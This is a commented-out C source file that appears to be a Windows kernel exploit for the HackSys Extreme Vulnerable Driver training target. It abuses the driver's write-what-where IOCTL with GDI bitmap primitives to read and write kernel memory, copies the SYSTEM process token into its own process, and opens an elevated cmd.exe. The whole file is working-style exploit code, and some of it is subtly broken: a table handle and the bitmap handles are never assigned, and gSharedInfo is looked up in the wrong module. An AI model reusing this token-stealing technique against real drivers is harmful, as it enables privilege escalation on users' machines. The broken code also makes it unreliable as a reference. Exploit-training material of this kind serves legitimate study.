//#include <stdio.h>
//#include <Windows.h>
//#include <winternl.h>
//#include <Psapi.h>
//#include <string.h>
//
//#define NT_SUCCESS(status)      (status >= 0)
//#define TABLE_COUNT             0x300
//#define MODULE_SIZE             0x1000
//#define BUFFER_SIZE             0xFA8
//#define PID_OFFSET              0x2E8
//#define TOKEN_OFFSET            0x358
//#define FLINK_OFFSET            0x2F0
//#define IO_CODE                 0x22200B
//#define ProcessBasicInformation 0
//
//typedef struct _WRITE_WHAT_WHERE {
//    PULONG_PTR What;
//    PULONG_PTR Where;
//} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;
//
//typedef struct _HANDLE_ENTRY
//{
//    PVOID pKernel;
//    union
//    {
//        PVOID pi;
//        PVOID pti;
//        PVOID ppi;
//    };
//    BYTE type;
//    BYTE flags;
//    WORD generation;
//} HANDLE_ENTRY, *PHANDLE_ENTRY;
//
//typedef struct _SHATEDINFO {
//    ULONG_PTR psi;
//    PHANDLE_ENTRY aheList;
//    ULONG HeEntrySize;
//    ULONG_PTR pDispInfo;
//    ULONG_PTR ulSharedDelta;
//    ULONG_PTR awmControl;
//    ULONG_PTR DefWindowMsgs;
//    ULONG_PTR DefWindowSpecMsgs;
//} SHATEDINFO, *PSHATEDINFO;
//
//typedef NTSTATUS (*pNtQueryInformationProcess)(
//    IN HANDLE ProcessHandle,
//    IN PROCESSINFOCLASS ProcessInformationClass,
//    OUT PVOID ProcessInformation,
//    IN ULONG ProcessInformationLength
//);
//
//pNtQueryInformationProcess selfNtQueryInformationProcess = NULL;
//HBITMAP hBitmap[2] = { 0 };
//ULONG_PTR pvScan0[2] = { 0 };
//ULONG64 moduleBase[MODULE_SIZE] = { 0 }; 
//CHAR buffer[BUFFER_SIZE] = { 0 };
//CHAR table[TABLE_COUNT * 6] = { 0 };
//ULONG64 kernelBase = 0;
//
//void ErrorOutput(const char* msg)
//{
//    printf(msg);
//    printf("[-] Error Code: %d\n", GetLastError());
//    exit(1);
//}
//
//ULONG_PTR GetTableAddr()
//{
//    ULONG_PTR prevTableAddr = 0;
//    while (1)
//    {
//        HACCEL hTable = NULL;
//        CreateAcceleratorTable((LPACCEL)table, TABLE_COUNT);
//        if (!hTable)
//        {
//            ErrorOutput("[-] Failed To Create AcceleratorTable\n");
//        }
//        HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
//        if (!hKernel32)
//        {
//            ErrorOutput("[-] Failed To Load kernel32.dll\n");
//        }
//        PSHATEDINFO gSharedInfo = NULL;
//        gSharedInfo = GetProcAddress(hKernel32, "gSharedInfo");
//        if (!hKernel32)
//        {
//            ErrorOutput("[-] Failed To Get gSharedInfo\n");
//        }
//        ULONG_PTR currTableAddr = gSharedInfo->aheList[LOWORD(hTable)].pKernel;
//        if (prevTableAddr == currTableAddr)
//        {
//            printf("[+] Get Surface Object Address: 0x%I64x\n", currTableAddr);
//            return currTableAddr;
//        }
//        prevTableAddr = currTableAddr;
//        DestroyAcceleratorTable(hTable);
//    }
//}
//
//void GetSurfaceAddr()
//{
//    for (int i = 0; i < 2; ++i)
//    {
//        pvScan0[i] = GetTableAddr() + 0x50;
//        CreateBitmap(BUFFER_SIZE, 0x1, 0x1, 0x8, buffer);
//        printf("[+] pvScan0[%d] Address: 0x%I64x\n", i, pvScan0[i]);
//    }
//}
//
//void GetKernelBase()
//{
//    // Get the base_address of ntoskrnl.exe in kernel
//    DWORD length = 0;
//    if (EnumDeviceDrivers((LPVOID)moduleBase, sizeof(moduleBase), (LPDWORD)&length))
//    {
//        kernelBase = moduleBase[0];
//        printf("[+] Kernel Base_Address: 0x%I64x\n", kernelBase);
//        return;
//    }
//    ErrorOutput("[-] Failed To Get Kernel Base_Address\n");
//}
//
//// read src to dest
//void ReadMemory(ULONG64 src, PULONG64 dest, ULONG64 len)
//{
//    memset(buffer, 0, BUFFER_SIZE);
//    *(PULONG64)buffer = src;
//    SetBitmapBits((ULONG64)((DWORD)hBitmap[0] & 0xFFFFFFFF), 0x8, buffer);
//    memset(buffer, 0, BUFFER_SIZE);
//    GetBitmapBits((ULONG64)((DWORD)hBitmap[1] & 0xFFFFFFFF), len, buffer);
//    *dest = *(PULONG64)buffer;
//}
//
//// write src to dest
//void WriteMemory(ULONG64 src, ULONG64 dest, ULONG64 len)
//{
//    memset(buffer, 0, BUFFER_SIZE);
//    *(PULONG64)buffer = (ULONG64)dest;
//    SetBitmapBits((ULONG64)((DWORD)hBitmap[0] & 0xFFFFFFFF), 0x8, buffer);
//    memset(buffer, 0, BUFFER_SIZE);
//    *(PULONG64)buffer = src;
//    SetBitmapBits((ULONG64)((DWORD)hBitmap[1] & 0xFFFFFFFF), len, buffer);
//}
//
//void StealToken()
//{
//    // Get System process's address
//    HMODULE hKernel = LoadLibraryA("ntoskrnl.exe");
//    if (!hKernel)
//    {
//        ErrorOutput("[-] Failed To Load ntoskrnl.exe\n");
//    }
//    ULONG64 pEprocess = GetProcAddress(hKernel, "PsInitialSystemProcess");
//    if (!pEprocess)
//    {
//        ErrorOutput("[-] Failed To Get EPROCESS Address\n");
//    }
//    ULONG64 PsInitialSystemProcess = pEprocess - (ULONG64)hKernel + kernelBase;
//    FreeLibrary(hKernel);
//    printf("[+] Get System's Address Pointer: 0x%I64x\n", PsInitialSystemProcess);
//    ReadMemory(PsInitialSystemProcess, &pEprocess, 0x8);
//    printf("[+] Get System's Address: 0x%I64x\n", pEprocess);
//
//    // Find current process's address
//    ULONG64 currProcPid = GetCurrentProcessId();
//    LIST_ENTRY processLink = { 0 };
//    ReadMemory(pEprocess + FLINK_OFFSET, &processLink, 0x8);
//    printf("[+] Get Flink: 0x%I64x\n", (ULONG64)processLink.Flink);
//    printf("[+] Current PID: 0x%I64x\n", currProcPid);
//    // Loop the double linklist to find the current process
//    while (1)
//    {
//        ULONG64 pTempEprocess = (ULONG64)processLink.Flink - FLINK_OFFSET;
//        ULONG64 tempPid = 0;
//        ReadMemory(pTempEprocess + PID_OFFSET, &tempPid, 0x8);
//        if (tempPid == currProcPid)
//        {
//            printf("[+] Temp PID: 0x%I64x\n", tempPid);
//            ULONG64 token = 0;
//            ReadMemory(pEprocess + TOKEN_OFFSET, &token, 0x8);
//            printf("[+] Token: 0x%I64x\n", token);
//            WriteMemory(token, pTempEprocess + TOKEN_OFFSET, 0x8);
//            break;
//        }
//        ReadMemory(pTempEprocess + FLINK_OFFSET, &processLink, 0x8);
//        if (pEprocess == processLink.Flink)
//        {
//            printf("[-] Failed To Get The Current Process's EPROCESS\n");
//            break;
//        }
//    }
//}
//
//void CreateCmd()
//{
//	STARTUPINFO si = { sizeof(si) };
//	PROCESS_INFORMATION pi = { 0 };
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow = SW_SHOW;
//	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
//	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
//	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
//}
//
//void CommunicateWithDriver()
//{
//    HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
//        GENERIC_WRITE | GENERIC_READ,
//        FILE_SHARE_READ | FILE_SHARE_WRITE,
//        0,
//        OPEN_EXISTING,
//        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
//        0);
//    if (hDevice == INVALID_HANDLE_VALUE)
//    {
//        ErrorOutput("[-] Failed To Open The file\n");
//    }
//    else
//    {
//        printf("[+] Driver Handle: %d\n", (ULONG)hDevice);
//    }
//    WRITE_WHAT_WHERE www = { 0 };
//    www.What = &pvScan0[1];
//    www.Where = pvScan0[0];
//    ULONG retLength = 0;
//    BOOL ret = DeviceIoControl(hDevice,
//        IO_CODE,
//        &www,
//        sizeof(WRITE_WHAT_WHERE),
//        NULL,
//        0,
//        &retLength,
//        NULL);
//    if (!ret)
//    {
//        ErrorOutput("[-] Failed To Send Message\n");
//    }
//}
//
//int main()
//{
//    GetSurfaceAddr();
//    GetKernelBase();
//    CommunicateWithDriver();
//    StealToken();
//    CreateCmd();
//    return 0;
//}